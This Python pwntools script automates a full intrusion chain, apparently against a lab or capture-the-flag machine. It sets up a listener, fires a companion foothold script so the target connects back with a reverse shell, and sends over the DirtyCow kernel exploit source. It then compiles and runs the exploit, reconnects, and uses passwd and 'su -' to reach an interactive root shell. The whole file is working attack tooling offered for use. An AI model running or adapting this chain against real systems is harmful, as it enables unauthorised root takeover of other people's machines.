#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import subprocess
import os
import argparse

def main(r_ip, php_code, l_ip, l_port, skip_dirty):
    if skip_dirty is None:
        # Listen the reverse shell
        l = listen(l_port)
        # Launch the reverse shell in background
        p = subprocess.Popen(["python2.7", os.path.dirname(os.path.abspath(__file__))+"/foothold.py", "-I", r_ip, "-F", php_code, "-R", l_ip, "-P", l_port], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
        l.wait_for_connection()
        # Send dirty cow exploit code
        with open(os.path.dirname(os.path.abspath(__file__))+'/c0w.c', 'r') as file:
            content = file.read()
            l.sendline(b"cat > c0w.c << EOF")
            l.sendline(str.encode(content)) 
            l.sendline(b"EOF")
            file.close()

        # Compile the exploit
        l.sendline(b"gcc c0w.c -o c0w -pthread -lcrypt")
        l.sendline(b"./c0w")
        p = log.progress('Waiting 3 minutess for DirtyCow ...')
        time.sleep(180)
        p.success('DirtyCow OK')

        l.close()

    # Listen the reverse shell
    l = listen(l_port)
    # Launch the reverse shell in background
    p = subprocess.Popen(["python2.7", os.path.dirname(os.path.abspath(__file__))+"/foothold.py", "-I", r_ip, "-F", php_code, "-R", l_ip, "-P", l_port], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
    l.wait_for_connection()

    l.sendline(b"/usr/bin/passwd")
    l.sendline(b"su -")
    l.sendline(b"whoami")
    l.interactive()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-I', '--remote_ip', required=True)
    parser.add_argument('-F', '--php_filename', required=True)
    parser.add_argument('-R', '--local_ip', required=True)
    parser.add_argument('-P', '--local_port', required=True)
    parser.add_argument('-S', '--skip_dirty', required=False)
    args = parser.parse_args()
    sys.exit(main(args.remote_ip, args.php_filename, args.local_ip, args.local_port, args.skip_dirty))